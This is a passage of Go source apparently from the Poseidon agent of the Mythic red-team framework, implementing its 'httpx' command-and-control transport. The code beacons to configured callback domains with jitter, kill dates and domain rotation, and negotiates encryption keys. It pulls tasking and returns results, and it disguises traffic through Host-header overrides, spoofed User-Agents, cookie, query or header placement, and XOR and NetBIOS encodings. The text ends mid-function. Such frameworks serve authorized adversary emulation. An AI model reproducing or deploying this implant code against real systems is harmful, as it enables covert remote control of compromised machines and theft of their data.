//go:build (linux || darwin) && httpx

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"golang.org/x/exp/slices"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// base64 encoded version of the JSON initial configuration of httpx
var httpx_initial_config string

type HTTPxInitialConfig struct {
	Killdate               string
	Interval               uint
	Jitter                 uint
	CallbackDomains        []string
	DomainRotationMethod   string
	FailoverThreshold      int
	EncryptedExchangeCheck bool
	AESPSK                 string
	RawC2Config            AgentVariations `json:"raw_c2_config"`
}

func (e *HTTPxInitialConfig) parseAgentVariationConfigMessageTransform(configArray []interface{}) []AgentVariationConfigMessageTransform {
	if configArray == nil {
		return make([]AgentVariationConfigMessageTransform, 0)
	}
	config := make([]AgentVariationConfigMessageTransform, len(configArray))
	for i := 0; i < len(configArray); i++ {
		entry := configArray[i].(map[string]interface{})
		config[i] = AgentVariationConfigMessageTransform{
			Action: entry["action"].(string),
			Value:  entry["value"].(string),
		}
	}
	return config
}
func (e *HTTPxInitialConfig) parseAgentVariationConfigClient(configMap map[string]interface{}) AgentVariationConfigClient {
	config := AgentVariationConfigClient{}
	if headers, ok := configMap["headers"]; ok && headers != nil {
		config.Headers = e.parseMapStringString(headers.(map[string]interface{}))
	} else {
		config.Headers = make(map[string]string)
	}
	if parameters, ok := configMap["parameters"]; ok && parameters != nil {
		config.Parameters = e.parseMapStringString(parameters.(map[string]interface{}))
	} else {
		config.Parameters = make(map[string]string)
	}

	if headers, ok := configMap["domain_specific_headers"]; ok && headers != nil {
		DomainHeaders := make(map[string]map[string]string)
		for j, k := range headers.(map[string]interface{}) {
			DomainHeaders[j] = e.parseMapStringString(k.(map[string]interface{}))
		}
		config.DomainSpecificHeaders = DomainHeaders
	} else {
		config.DomainSpecificHeaders = make(map[string]map[string]string)
	}
	config.Message.Name = configMap["message"].(map[string]interface{})["name"].(string)
	config.Message.Location = configMap["message"].(map[string]interface{})["location"].(string)
	if transforms, ok := configMap["transforms"]; ok && transforms != nil {
		config.Transforms = e.parseAgentVariationConfigMessageTransform(transforms.([]interface{}))
	} else {
		config.Transforms = []AgentVariationConfigMessageTransform{}
	}
	return config
}
func (e *HTTPxInitialConfig) parseAgentVariationConfigServer(configMap map[string]interface{}) AgentVariationConfigServer {
	config := AgentVariationConfigServer{}
	if headers, ok := configMap["headers"]; ok && headers != nil {
		config.Headers = e.parseMapStringString(headers.(map[string]interface{}))
	} else {
		config.Headers = make(map[string]string)
	}
	if transforms, ok := configMap["transforms"]; ok && transforms != nil {
		config.Transforms = e.parseAgentVariationConfigMessageTransform(transforms.([]interface{}))
	} else {
		config.Transforms = []AgentVariationConfigMessageTransform{}
	}
	return config
}
func (e *HTTPxInitialConfig) parseMapStringString(configMap map[string]interface{}) map[string]string {
	serverHeaders := make(map[string]string)
	if configMap != nil {
		for j, k := range configMap {
			serverHeaders[j] = k.(string)
		}
	}
	return serverHeaders
}
func (e *HTTPxInitialConfig) parseStringArray(configArray []interface{}) []string {
	urls := make([]string, len(configArray))
	if configArray != nil {
		for l, p := range configArray {
			urls[l] = p.(string)
		}
	}
	return urls
}
func (e *HTTPxInitialConfig) parseRawC2Config(configMap map[string]interface{}) AgentVariations {
	RawC2Config := AgentVariations{}
	getConfig := AgentVariationConfig{}
	postConfig := AgentVariationConfig{}
	RawC2Config.Name = configMap["name"].(string)

	get := configMap["get"].(map[string]interface{})
	getConfig.Verb = get["verb"].(string)
	if uris, ok := get["uris"]; ok {
		getConfig.URIs = e.parseStringArray(uris.([]interface{}))
	}
	if clientConfig, ok := get["client"]; ok && clientConfig != nil {
		getConfig.Client = e.parseAgentVariationConfigClient(clientConfig.(map[string]interface{}))
	}
	if serverConfig, ok := get["server"]; ok && serverConfig != nil {
		getConfig.Server = e.parseAgentVariationConfigServer(serverConfig.(map[string]interface{}))
	}

	post := configMap["post"].(map[string]interface{})
	postConfig.Verb = post["verb"].(string)
	if uris, ok := post["uris"]; ok {
		postConfig.URIs = e.parseStringArray(uris.([]interface{}))
	}
	if clientConfig, ok := post["client"]; ok && clientConfig != nil {
		postConfig.Client = e.parseAgentVariationConfigClient(clientConfig.(map[string]interface{}))
	}
	if serverConfig, ok := post["server"]; ok && serverConfig != nil {
		postConfig.Server = e.parseAgentVariationConfigServer(serverConfig.(map[string]interface{}))
	}

	RawC2Config.Get = getConfig
	RawC2Config.Post = postConfig
	return RawC2Config
}
func (e *HTTPxInitialConfig) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["killdate"]; ok {
		e.Killdate = v.(string)
	}
	if v, ok := alias["callback_interval"]; ok {
		e.Interval = uint(v.(float64))
	}
	if v, ok := alias["callback_jitter"]; ok {
		e.Jitter = uint(v.(float64))
	}
	if v, ok := alias["encrypted_exchange_check"]; ok {
		e.EncryptedExchangeCheck = v.(bool)
	}
	if v, ok := alias["AESPSK"]; ok {
		e.AESPSK = v.(string)
	}
	if v, ok := alias["domain_rotation"]; ok {
		e.DomainRotationMethod = v.(string)
	}
	if v, ok := alias["failover_threshold"]; ok {
		e.FailoverThreshold = int(v.(float64))
	}
	if v, ok := alias["callback_domains"]; ok {
		e.CallbackDomains = e.parseStringArray(v.([]interface{}))
	}
	if v, ok := alias["raw_c2_config"]; ok {
		e.RawC2Config = e.parseRawC2Config(v.(map[string]interface{}))
	}
	return nil
}

type AgentVariationConfigMessageTransform struct {
	Action string
	Value  string
}
type AgentVariationConfigMessage struct {
	Location string
	Name     string
}
type AgentVariationConfigClient struct {
	Headers               map[string]string
	Parameters            map[string]string
	DomainSpecificHeaders map[string]map[string]string
	Message               AgentVariationConfigMessage
	Transforms            []AgentVariationConfigMessageTransform
}
type AgentVariationConfigServer struct {
	Headers    map[string]string
	Transforms []AgentVariationConfigMessageTransform
}
type AgentVariationConfig struct {
	Verb   string
	URIs   []string
	Client AgentVariationConfigClient
	Server AgentVariationConfigServer
}
type AgentVariations struct {
	Name string
	Get  AgentVariationConfig
	Post AgentVariationConfig
}

type C2HTTPx struct {
	Interval                 int
	Jitter                   int
	CallbackDomains          []string
	CallbackDomainsFailCount []int
	CurrentDomain            int
	DomainRotationMethod     string
	FailoverThreshold        int
	Killdate                 time.Time
	ExchangingKeys           bool
	ChunkSize                int
	// internally set pieces
	Config                AgentVariations
	Key                   string
	RsaPrivateKey         *rsa.PrivateKey
	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
}

// New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(httpx_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial httpx config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := HTTPxInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial httpx config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		utils.PrintDebug("Kill date failed to parse. Exiting.")
		os.Exit(1)
	}
	profile := C2HTTPx{
		Key:                   initialConfig.AESPSK,
		Killdate:              killDateTime,
		CallbackDomains:       initialConfig.CallbackDomains,
		CurrentDomain:         0,
		FailoverThreshold:     initialConfig.FailoverThreshold,
		DomainRotationMethod:  initialConfig.DomainRotationMethod,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
	}
	// set initial fail counts to be 0
	CallbackDomainFailCounts := make([]int, len(initialConfig.CallbackDomains))
	for i, _ := range profile.CallbackDomains {
		CallbackDomainFailCounts[i] = 0
	}
	profile.CallbackDomainsFailCount = CallbackDomainFailCounts

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	// Add Agent Configuration
	profile.Config = initialConfig.RawC2Config
	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
	RegisterAvailableC2Profile(&profile)
}

func (c *C2HTTPx) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					getTaskingRequest := false
					if message.Delegates == nil && message.Edges == nil && message.InteractiveTasks == nil &&
						message.Responses == nil && message.Rpfwds == nil && message.Socks == nil {
						getTaskingRequest = true
					}
					resp := c.SendMessage(encResponse, getTaskingRequest)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							c.Sleep()
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				c.Sleep()
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2HTTPx) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}
func (c *C2HTTPx) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to httpx\n")
	<-c.stoppedChannel
	utils.PrintDebug("httpx fully stopped\n")
}
func (c *C2HTTPx) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "encryption_key":
		c.Key = value
	case "interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "config":
		if err := json.Unmarshal([]byte(value), &c.Config); err != nil {
			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal new agent configuration: %v\n", err))
		}
	case "callback_domains":
		newDomains := []string{}
		err := json.Unmarshal([]byte(value), &newDomains)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal new callback domains: %v\n", err))
			return
		}
		if len(newDomains) == 0 {
			utils.PrintDebug(fmt.Sprintf("got no new domains for the rotation"))
			return
		}
		c.CurrentDomain = 0
		c.CallbackDomains = newDomains
		c.CallbackDomainsFailCount = make([]int, len(c.CallbackDomains))
		for i, _ := range c.CallbackDomainsFailCount {
			c.CallbackDomainsFailCount[i] = 0
		}
	}
}
func (c *C2HTTPx) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}
func (c *C2HTTPx) GetSleepInterval() int {
	return c.Interval
}
func (c *C2HTTPx) GetSleepJitter() int {
	return c.Jitter
}
func (c *C2HTTPx) GetKillDate() time.Time {
	return c.Killdate
}
func (c *C2HTTPx) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}
func (c *C2HTTPx) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}
func (c *C2HTTPx) ProfileName() string {
	return "httpx"
}
func (c *C2HTTPx) IsP2P() bool {
	return false
}
func (c *C2HTTPx) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2HTTPx) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			c.Sleep()
			continue
		} else {
			resp := c.SendMessage(raw, false)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				c.Sleep()
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				return response
			} else {
				c.Sleep()
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2HTTPx) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw, false)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2HTTPx) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2HTTPx) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2HTTPx) IsRunning() bool {
	return !c.ShouldStop
}
func (c *C2HTTPx) increaseErrorCount() {
	c.CallbackDomainsFailCount[c.CurrentDomain] += 1
	if c.DomainRotationMethod == "fail-over" {
		if c.CallbackDomainsFailCount[c.CurrentDomain] >= c.FailoverThreshold {
			c.CallbackDomainsFailCount[c.CurrentDomain] = 0
			c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
		}
	} else if c.DomainRotationMethod == "round-robin" {
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
	} else if c.DomainRotationMethod == "random" {
		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
	} else {
		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
	}
}
func (c *C2HTTPx) increaseSuccessfulMessage() {
	if c.DomainRotationMethod == "fail-over" {
		c.CallbackDomainsFailCount[c.CurrentDomain] = 0
	} else if c.DomainRotationMethod == "round-robin" {
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
	} else if c.DomainRotationMethod == "random" {
		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
	} else {
		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
	}
}

func (c *C2HTTPx) SendMessage(sendData []byte, isGetTaskingRequest bool) []byte {
	// If the AesPSK is set, encrypt the data we send
	defer func() {
		// close all idle connections
		client.CloseIdleConnections()
	}()
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//fmt.Printf("Sending: %v\n", string(sendData))
	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	//byteBuffer := bytes.NewBuffer(sendDataBase64)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			utils.PrintDebug(fmt.Sprintf("After killdate, exiting\n"))
			os.Exit(1)
		}
		req, err := c.CreateDynamicMessage(sendDataBase64, isGetTaskingRequest)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			c.increaseErrorCount()
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
			c.increaseErrorCount()
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if resp.StatusCode != 200 {
			resp.Body.Close()
			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
			c.increaseErrorCount()
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		raw, err := c.GetDynamicMessageResponse(resp, isGetTaskingRequest)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error getting message response: %v\n", err))
			c.increaseErrorCount()
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		raw, err = base64.StdEncoding.DecodeString(string(raw))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
			c.increaseErrorCount()
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
			c.increaseErrorCount()
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
				c.increaseErrorCount()
				IncrementFailedConnection(c.ProfileName())
				c.Sleep()
				continue
			} else {
				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
				c.increaseSuccessfulMessage()
				return enc_raw
			}
		} else {
			//fmt.Printf("response: %v\n", string(raw))
			c.increaseSuccessfulMessage()
			return raw[36:]
		}
	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	c.increaseErrorCount()
	return make([]byte, 0) //shouldn't get here
}

// HTTPx mutation functions
func (c *C2HTTPx) transformBase64(prev []byte, value string) ([]byte, error) {
	return []byte(base64.StdEncoding.EncodeToString(prev)), nil
}
func (c *C2HTTPx) transformBase64Reverse(prev []byte, value string) ([]byte, error) {
	decodedLength := base64.StdEncoding.DecodedLen(len(prev))
	decoded := make([]byte, decodedLength)
	actualDecoded, err := base64.StdEncoding.Decode(decoded, prev)
	if err != nil {
		return nil, err
	}
	return decoded[:actualDecoded], nil
}

func (c *C2HTTPx) transformBase64URL(prev []byte, value string) ([]byte, error) {
	return []byte(base64.URLEncoding.EncodeToString(prev)), nil
}
func (c *C2HTTPx) transformBase64URLReverse(prev []byte, value string) ([]byte, error) {
	decodedLength := base64.URLEncoding.DecodedLen(len(prev))
	decoded := make([]byte, decodedLength)
	actualDecoded, err := base64.URLEncoding.Decode(decoded, prev)
	if err != nil {
		return nil, err
	}
	return decoded[:actualDecoded], nil
}

func (c *C2HTTPx) transformPrepend(prev []byte, value string) ([]byte, error) {
	return append([]byte(value), prev...), nil
}
func (c *C2HTTPx) transformPrependReverse(prev []byte, value string) ([]byte, error) {
	if len(value) > len(prev) {
		return nil, errors.New("prepend value is longer that full value")
	}
	return prev[len(value):], nil
}

func (c *C2HTTPx) transformAppend(prev []byte, value string) ([]byte, error) {
	return append(prev, []byte(value)...), nil
}
func (c *C2HTTPx) transformAppendReverse(prev []byte, value string) ([]byte, error) {
	if len(value) > len(prev) {
		return nil, errors.New("append value is longer that full value")
	}
	return prev[:len(prev)-len(value)], nil
}

func (c *C2HTTPx) transformXor(prev []byte, value string) ([]byte, error) {
	output := make([]byte, len(prev))
	for i := 0; i < len(prev); i++ {
		output[i] = prev[i] ^ value[i%len(value)]
	}
	return output, nil
}
func (c *C2HTTPx) transformXorReverse(prev []byte, value string) ([]byte, error) {
	return c.transformXor(prev, value)
}

func (c *C2HTTPx) transformNetbios(prev []byte, value string) ([]byte, error) {
	// split each byte into two nibbles
	// pad each nibble out to a byte with zeros
	// add 'a' (0x61)
	output := make([]byte, len(prev)*2)
	for i := 0; i < len(prev); i++ {
		right := (prev[i] & 0x0F) + 0x61
		left := ((prev[i] & 0xF0) >> 4) + 0x61
		output[i*2] = left
		output[(i*2)+1] = right
	}
	return output, nil
}
func (c *C2HTTPx) transformNetbiosReverse(prev []byte, value string) ([]byte, error) {
	output := make([]byte, len(prev)/2)
	for i := 0; i < len(output); i++ {
		left := (prev[i*2] - 0x61) << 4
		right := prev[i*2+1] - 0x61
		output[i] = left | right
	}
	return output, nil
}

func (c *C2HTTPx) transformNetbiosu(prev []byte, value string) ([]byte, error) {
	// split each byte into two nibbles
	// pad each nibble out to a byte with zeros
	// add 'a' (0x61)
	output := make([]byte, len(prev)*2)
	for i := 0; i < len(prev); i++ {
		right := (prev[i] & 0x0F) + 0x41
		left := ((prev[i] & 0xF0) >> 4) + 0x41
		output[i*2] = left
		output[(i*2)+1] = right
	}
	return output, nil
}
func (c *C2HTTPx) transformNetbiosuReverse(prev []byte, value string) ([]byte, error) {
	output := make([]byte, len(prev)/2)
	for i := 0; i < len(output); i++ {
		left := (prev[i*2] - 0x41) << 4
		right := prev[i*2+1] - 0x41
		output[i] = left | right
	}
	return output, nil
}

func (c *C2HTTPx) performTransforms(initialData []byte, variation AgentVariationConfig) ([]byte, error) {
	tempModifier := initialData
	for i := 0; i < len(variation.Client.Transforms); i++ {
		utils.PrintDebug(fmt.Sprintf("Performing transform: %s", variation.Client.Transforms[i].Action))
		switch strings.ToLower(variation.Client.Transforms[i].Action) {
		case "base64":
			newTemp, err := c.transformBase64(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "prepend":
			newTemp, err := c.transformPrepend(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "append":
			newTemp, err := c.transformAppend(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "base64url":
			newTemp, err := c.transformBase64URL(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "xor":
			newTemp, err := c.transformXor(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "netbios":
			newTemp, err := c.transformNetbios(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "netbiosu":
			newTemp, err := c.transformNetbiosu(tempModifier, variation.Client.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		default:
		}
	}
	return tempModifier, nil
}
func (c *C2HTTPx) performReverseTransforms(initialData []byte, variation AgentVariationConfig) ([]byte, error) {
	tempModifier := initialData
	for i := len(variation.Server.Transforms) - 1; i >= 0; i-- {
		utils.PrintDebug(fmt.Sprintf("Performing transform: %s", variation.Server.Transforms[i].Action))
		switch strings.ToLower(variation.Server.Transforms[i].Action) {
		case "base64":
			newTemp, err := c.transformBase64Reverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "prepend":
			newTemp, err := c.transformPrependReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "append":
			newTemp, err := c.transformAppendReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "base64url":
			newTemp, err := c.transformBase64URLReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "xor":
			newTemp, err := c.transformXorReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "netbios":
			newTemp, err := c.transformNetbiosReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "netbiosu":
			newTemp, err := c.transformNetbiosuReverse(tempModifier, variation.Server.Transforms[i].Value)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		default:
		}
	}
	return tempModifier, nil
}

func (c *C2HTTPx) CreateDynamicMessage(content []byte, isGetTaskingRequest bool) (*http.Request, error) {
	// generate the request
	var variation AgentVariationConfig
	if isGetTaskingRequest {
		variation = c.Config.Get
	} else {
		variation = c.Config.Post
	}
	var bodyBuffer *bytes.Buffer
	var bodyBytes []byte
	utils.PrintDebug(fmt.Sprintf("original message message: %s", string(content)))
	agentMessageBytes, err := c.performTransforms(content, variation)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create message: %s", err.Error()))
		return nil, err
	}
	if isGetTaskingRequest {
		bodyBytes = make([]byte, 0)
	} else {
		if len(agentMessageBytes) == 0 {
			bodyBytes = make([]byte, 0)
		} else if slices.Contains([]string{"", "body"}, variation.Client.Message.Location) {
			bodyBytes = agentMessageBytes
		} else {
			bodyBytes = make([]byte, 0)
		}
	}
	bodyBuffer = bytes.NewBuffer(bodyBytes)
	// select a URI from this variation at random
	uriIndex := rand.Intn(len(variation.URIs))
	url := c.CallbackDomains[c.CurrentDomain] + variation.URIs[uriIndex]
	utils.PrintDebug(fmt.Sprintf("method: %s\nURL: %s\n", variation.Verb, url))
	req, err := http.NewRequest(variation.Verb, url, bodyBuffer)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
		return nil, err
	}
	q := req.URL.Query()
	switch variation.Client.Message.Location {
	case "cookie":
		req.AddCookie(&http.Cookie{
			Name:  variation.Client.Message.Name,
			Value: string(agentMessageBytes),
		})
	case "query":
		q.Add(variation.Client.Message.Name, string(agentMessageBytes))
	case "header":
		req.Header.Set(variation.Client.Message.Name, string(agentMessageBytes))
	default:
		// do nothing, it's the body and we already added it
	}
	for key, _ := range variation.Client.Headers {
		if key == "Host" {
			req.Host = variation.Client.Headers[key]
		} else if key == "User-Agent" {
			req.Header.Set(key, variation.Client.Headers[key])
			tr.ProxyConnectHeader = http.Header{}
			tr.ProxyConnectHeader.Add("User-Agent", variation.Client.Headers[key])
		} else if key == "Content-Length" {
			continue
		} else {
			req.Header.Set(key, variation.Client.Headers[key])
		}
	}
	for domain, _ := range variation.Client.DomainSpecificHeaders {
		if domain == c.CallbackDomains[c.CurrentDomain] {
			for key, _ := range variation.Client.DomainSpecificHeaders[domain] {
				if key == "Host" {
					req.Host = variation.Client.DomainSpecificHeaders[domain][key]
				} else if key == "User-Agent" {
					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
					tr.ProxyConnectHeader = http.Header{}
					tr.ProxyConnectHeader.Add("User-Agent", variation.Client.DomainSpecificHeaders[domain][key])
				} else if key == "Content-Length" {
					continue
				} else {
					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
				}
			}
		}

	}
	// adding query parameters is a little weird in go

